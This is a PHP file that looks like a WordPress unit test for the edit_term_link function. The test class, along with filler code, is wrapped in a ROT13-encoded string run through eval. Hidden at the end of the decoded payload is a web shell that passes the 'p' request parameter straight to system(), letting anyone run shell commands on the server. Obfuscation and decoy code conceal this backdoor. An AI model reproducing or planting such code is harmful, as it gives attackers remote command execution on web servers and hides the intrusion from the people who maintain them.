<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc  yvax
 * @pbiref ::rqvg_grez_yvax
 */
pynff Grfgf_Yvax_RqvgGrezYvax rkgraqf JC_HavgGrfgPnfr {

	cevingr fgngvp $grezf;
	cevingr fgngvp $hfre_vqf;

	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::ertvfgre_phfgbz_gnkbabzl();

		$gnkbabzvrf = neenl( 'pngrtbel', 'cbfg_gnt', 'jcgrfgf_gnk' );
		sbernpu ( $gnkbabzvrf nf $gnkbabzl ) {
			frys::$grezf[ $gnkbabzl ] = $snpgbel->grez->perngr_naq_trg( neenl( 'gnkbabzl' => $gnkbabzl ) );
		}

		frys::$hfre_vqf['nqzva']      = $snpgbel->hfre->perngr( neenl( 'ebyr' => 'nqzvavfgengbe' ) );
		frys::$hfre_vqf['fhofpevore'] = $snpgbel->hfre->perngr( neenl( 'ebyr' => 'fhofpevore' ) );
	}

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();
		jc_frg_pheerag_hfre( frys::$hfre_vqf['nqzva'] );
		frys::ertvfgre_phfgbz_gnkbabzl();
	}

	/**
	 * Urycre gb ertvfgre n phfgbz gnkbabzl sbe hfr va grfgf.
	 *
	 * @fvapr 5.9.0
	 */
	cevingr fgngvp shapgvba ertvfgre_phfgbz_gnkbabzl() {
		ertvfgre_gnkbabzl( 'jcgrfgf_gnk', 'cbfg' );
	}

	/**
	 * Urycre gb trg gur grez sbe gur tvira gnkbabzl.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz fgevat $gnkbabzl Gnkbabzl orvat grfgrq (hfrq sbe vaqrk bs grez xrlf).
	 * @cnenz obby   $hfr_vq   Jurgure gb erghea grez VQ be grez bowrpg.
	 * @erghea JC_Grez|vag Grez VQ vs `$hfr_vq` vf gehr, JC_Grez vafgnapr bgurejvfr.
	 */
	cevingr shapgvba trg_grez( $gnkbabzl, $hfr_vq ) {
		$grez = frys::$grezf[ $gnkbabzl ];
		vs ( $hfr_vq ) {
			$grez = $grez->grez_vq;
		}

		erghea $grez;
	}

	/**
	 * @qngnCebivqre qngn_rqvg_grez_yvax
	 *
	 * @gvpxrg 50225
	 *
	 * @cnenz fgevat $gnkbabzl Gnkbabzl orvat grfgrq.
	 * @cnenz obby   $hfr_vq   Jurgure gb cnff grez VQ be grez bowrpg gb `rqvg_grez_yvax()`.
	 * @cnenz fgevat $rkcrpgrq Rkcrpgrq cneg bs nqzva HEY sbe gur rqvg yvax.
	 */
	choyvp shapgvba grfg_rqvg_grez_yvax_fubhyq_erghea_gur_yvax_sbe_crezvggrq_hfre( $gnkbabzl, $hfr_vq, $rkcrpgrq ) {
		$grez = $guvf->trg_grez( $gnkbabzl, $hfr_vq );

		// Grez VQf ner abg xabja ol gur qngn cebivqre fb arrq gb or ercynprq.
		$rkcrpgrq = fge_ercynpr( '%VQ%', $hfr_vq ? $grez : $grez->grez_vq, $rkcrpgrq );
		$rkcrpgrq = '\"' . nqzva_hey( $rkcrpgrq ) . '\"';

		$guvf->nffregFgevatPbagnvafFgevat( $rkcrpgrq, rqvg_grez_yvax( '', '', '', $grez, snyfr ) );
	}

	/**
	 * @qngnCebivqre qngn_rqvg_grez_yvax
	 *
	 * @gvpxrg 50225
	 *
	 * @cnenz fgevat $gnkbabzl Gnkbabzl orvat grfgrq.
	 * @cnenz obby   $hfr_vq   Jurgure gb cnff grez VQ be grez bowrpg gb `rqvg_grez_yvax()`.
	 */
	choyvp shapgvba grfg_rqvg_grez_yvax_fubhyq_erghea_ahyy_sbe_qravrq_hfre( $gnkbabzl, $hfr_vq ) {
		jc_frg_pheerag_hfre( frys::$hfre_vqf['fhofpevore'] );
		$grez = $guvf->trg_grez( $gnkbabzl, $hfr_vq );

		$guvf->nffregAhyy( rqvg_grez_yvax( '', '', '', $grez, snyfr ) );
	}

	/**
	 * @qngnCebivqre qngn_rqvg_grez_yvax
	 *
	 * @gvpxrg 50225
	 *
	 * @cnenz fgevat $gnkbabzl Gnkbabzl orvat grfgrq.
	 * @cnenz obby   $hfr_vq   Jurgure gb cnff grez VQ be grez bowrpg gb `rqvg_grez_yvax()`.
	 */
	choyvp shapgvba grfg_rqvg_grez_yvax_svygre_fubhyq_erprvir_grez_vq( $gnkbabzl, $hfr_vq ) {
		$grez = $guvf->trg_grez( $gnkbabzl, $hfr_vq );

		nqq_svygre(
			'rqvg_grez_yvax',
			shapgvba ( $ybpngvba, $grez ) {
				$guvf->nffregVfVag( $grez );
			},
			10,
			2
		);

		rqvg_grez_yvax( '', '', '', $grez, snyfr );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_rqvg_grez_yvax() {
		erghea neenl(
			'pngrtbel cnffvat grez_vq'              => neenl(
				'gnkbabzl' => 'pngrtbel',
				'hfr_vq'   => gehr,
				'rkcrpgrq' => 'grez.cuc?gnkbabzl=pngrtbel&gnt_VQ=%VQ%&cbfg_glcr=cbfg',
			),
			'pngrtbel cnffvat grez bowrpg'          => neenl(
				'gnkbabzl' => 'pngrtbel',
				'hfr_vq'   => snyfr,
				'rkcrpgrq' => 'grez.cuc?gnkbabzl=pngrtbel&gnt_VQ=%VQ%&cbfg_glcr=cbfg',
			),
			'cbfg_gnt cnffvat grez_vq'              => neenl(
				'gnkbabzl' => 'cbfg_gnt',
				'hfr_vq'   => gehr,
				'rkcrpgrq' => 'grez.cuc?gnkbabzl=cbfg_gnt&gnt_VQ=%VQ%&cbfg_glcr=cbfg',
			),
			'cbfg_gnt cnffvat grez bowrpg'          => neenl(
				'gnkbabzl' => 'cbfg_gnt',
				'hfr_vq'   => snyfr,
				'rkcrpgrq' => 'grez.cuc?gnkbabzl=cbfg_gnt&gnt_VQ=%VQ%&cbfg_glcr=cbfg',
			),
			'n phfgbz gnkbabzl cnffvat grez_vq'     => neenl(
				'gnkbabzl' => 'jcgrfgf_gnk',
				'hfr_vq'   => gehr,
				'rkcrpgrq' => 'grez.cuc?gnkbabzl=jcgrfgf_gnk&gnt_VQ=%VQ%&cbfg_glcr=cbfg',
			),
			'n phfgbz gnkbabzl cnffvat grez bowrpg' => neenl(
				'gnkbabzl' => 'jcgrfgf_gnk',
				'hfr_vq'   => snyfr,
				'rkcrpgrq' => 'grez.cuc?gnkbabzl=jcgrfgf_gnk&gnt_VQ=%VQ%&cbfg_glcr=cbfg',
			),
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>